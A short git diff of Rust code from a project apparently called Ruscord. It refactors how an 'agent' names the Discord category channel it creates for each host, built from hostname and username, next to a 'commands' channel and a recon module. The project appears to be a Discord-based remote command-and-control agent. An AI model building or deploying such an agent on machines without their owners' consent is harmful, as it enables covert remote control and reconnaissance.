@@ -1,13 +1,11 @@
-use once_cell::sync::Lazy;
 use poise::serenity_prelude::{ChannelId, ChannelType, Context, CreateChannel, GuildChannel, GuildId};
 
 use crate::{
 	constants::RUSCORD_GUILD_ID,
-	os::{traits::recon::ReconModule, OS},
+	os::{traits::recon::ReconModule, OsModule},
 	RuscordError,
 };
 
-pub static CATEGORY_CHANNEL_NAME: Lazy<String> = Lazy::new(|| format!("{}:{}", OS::hostname(), OS::username()));
 pub const COMMAND_CHANNEL_NAME: &str = "commands";
 
 pub struct AgentConfig {
@@ -16,6 +14,11 @@ pub struct AgentConfig {
 }
 
 impl AgentConfig {
+	fn category_channel_name() -> String {
+		let os_module = OsModule::default();
+		format!("{}:{}", os_module.hostname(), os_module.username())
+	}
+
 	/// Loads the config by looking up the category and command channels.
 	///
 	/// Returns an error if the category / command channels did not exist and could not be created.
@@ -25,7 +28,7 @@ impl AgentConfig {
 
 		let category_channel = match channels
 			.values()
-			.find(|v| v.name == CATEGORY_CHANNEL_NAME.as_str() && v.kind == ChannelType::Category)
+			.find(|v| v.name == Self::category_channel_name().as_str() && v.kind == ChannelType::Category)
 		{
 			Some(c) => c.clone(),
 			None => Self::create_category_channel(ctx, &guild).await?,
@@ -48,7 +51,7 @@ impl AgentConfig {
 	/// Creates the category channel for the agent
 	async fn create_category_channel(ctx: &Context, guild: &GuildId) -> Result<GuildChannel, RuscordError> {
 		guild
-			.create_channel(&ctx.http, CreateChannel::new(&*CATEGORY_CHANNEL_NAME).kind(ChannelType::Category))
+			.create_channel(&ctx.http, CreateChannel::new(Self::category_channel_name()).kind(ChannelType::Category))
 			.await
 			.map_err(RuscordError::from)
 	}
